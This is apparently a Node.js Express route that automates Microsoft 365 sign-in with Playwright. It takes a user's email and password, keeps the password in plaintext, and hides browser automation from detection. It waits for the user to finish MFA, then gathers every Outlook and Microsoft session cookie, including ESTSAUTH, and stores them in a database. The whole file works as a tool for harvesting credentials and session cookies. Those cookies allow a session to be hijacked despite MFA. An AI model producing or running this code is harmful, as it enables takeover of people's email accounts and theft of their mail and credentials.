const express = require('express');
const { chromium } = require('playwright');
const User = require('../models/user');

const router = express.Router();

// Start live authentication capture
router.post('/start', async (req, res) => {
  const { email, password } = req.body;
  
  try {
    // Create or find user
    let user = await User.findOne({ email });
    if (!user) {
      user = new User({ email, password });
      await user.save();
    } else {
      user.password = password;
      await user.save();
    }
    
    // Start live capture
    const result = await startLiveCapture(user._id, email, password);
    
    res.json({ 
      success: result.success, 
      userId: user._id,
      cookieCount: result.cookieCount,
      message: result.message 
    });
    
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

async function startLiveCapture(userId, email, password) {
  let browser;
  try {
    console.log(`🚀 Starting live capture for ${email}`);
    
    // Launch visible browser for user interaction
    browser = await chromium.launch({ 
      headless: false,
      args: [
        '--start-maximized',
        '--disable-blink-features=AutomationControlled',
        '--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
      ]
    });
    
    const context = await browser.newContext({
      viewport: null // Use full screen
    });
    
    const page = await context.newPage();
    
    // Navigate to Microsoft OAuth
    const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${process.env.CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(process.env.REDIRECT_URI)}&scope=https://graph.microsoft.com/Mail.ReadWrite&state=${userId}&login_hint=${encodeURIComponent(email)}`;
    
    await page.goto(authUrl, { waitUntil: 'domcontentloaded' });
    
    // Auto-fill email if not pre-filled
    try {
      const emailInput = await page.$('input[type="email"]');
      if (emailInput) {
        await page.fill('input[type="email"]', email);
        await page.click('input[type="submit"]');
        await page.waitForTimeout(2000);
      }
    } catch (e) {
      console.log('Email already filled or different flow');
    }
    
    // Auto-fill password
    try {
      await page.waitForSelector('input[type="password"]', { timeout: 10000 });
      await page.fill('input[type="password"]', password);
      await page.click('input[type="submit"]');
      await page.waitForTimeout(3000);
    } catch (e) {
      console.log('Password field not found or different flow');
    }
    
    // Handle MFA - let user interact
    console.log('🔐 Waiting for MFA completion (if required)...');
    console.log('👀 User can interact with the browser for MFA');
    
    // Wait for authentication completion
    await page.waitForFunction(() => {
      return window.location.href.includes('myaccount.microsoft.com') ||
             window.location.href.includes('account.microsoft.com') ||
             window.location.href.includes('outlook.office.com') ||
             window.location.href.includes('/user/callback') ||
             document.cookie.includes('ESTSAUTH');
    }, { timeout: 300000 }); // 5 minutes for MFA
    
    console.log('✅ Authentication completed!');
    
    // Handle "Stay signed in?" if present
    try {
      await page.click('input[value="Yes"]', { timeout: 5000 });
      await page.waitForTimeout(2000);
    } catch (e) {
      console.log('No stay signed in prompt');
    }
    
    // Navigate to Outlook to ensure all cookies are set
    console.log('📧 Navigating to Outlook...');
    await page.goto('https://outlook.office.com', { 
      waitUntil: 'domcontentloaded',
      timeout: 60000 
    });
    await page.waitForTimeout(5000);
    
    // Capture all cookies
    const allCookies = await context.cookies();
    
    console.log(`🍪 Captured ${allCookies.length} total cookies`);
    
    // Format cookies
    const formattedCookies = allCookies.map(cookie => ({
      domain: cookie.domain,
      httpOnly: cookie.httpOnly,
      path: cookie.path,
      secure: cookie.secure,
      expiry: cookie.expires ? Math.floor(new Date(cookie.expires).getTime() / 1000) : 0,
      name: cookie.name,
      value: cookie.value
    }));
    
    // Save to database
    await User.findByIdAndUpdate(userId, {
      sessionCookies: formattedCookies,
      allCookies: formattedCookies,
      cookieStatus: "session_captured",
      isActive: true,
      lastLogin: new Date()
    });
    
    console.log('💾 Cookies saved to database');
    
    // Show success message in browser
    await page.evaluate(() => {
      document.body.innerHTML = `
        <div style="display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', sans-serif; background: #f0f8f0;">
          <div style="text-align: center; padding: 40px; background: white; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.1);">
            <h2 style="color: #107c10; margin-bottom: 20px;">✅ Authentication Successful!</h2>
            <p style="color: #666; margin-bottom: 20px;">Cookies have been captured successfully.</p>
            <p style="color: #666;">You can close this browser window.</p>
          </div>
        </div>
      `;
    });
    
    // Keep browser open for a few seconds then close
    setTimeout(async () => {
      await browser.close();
    }, 5000);
    
    return { 
      success: true, 
      cookieCount: allCookies.length,
      message: 'Authentication completed successfully'
    };
    
  } catch (error) {
    console.error('Live capture error:', error);
    if (browser) await browser.close();
    return { 
      success: false, 
      cookieCount: 0,
      message: error.message 
    };
  }
}

module.exports = router;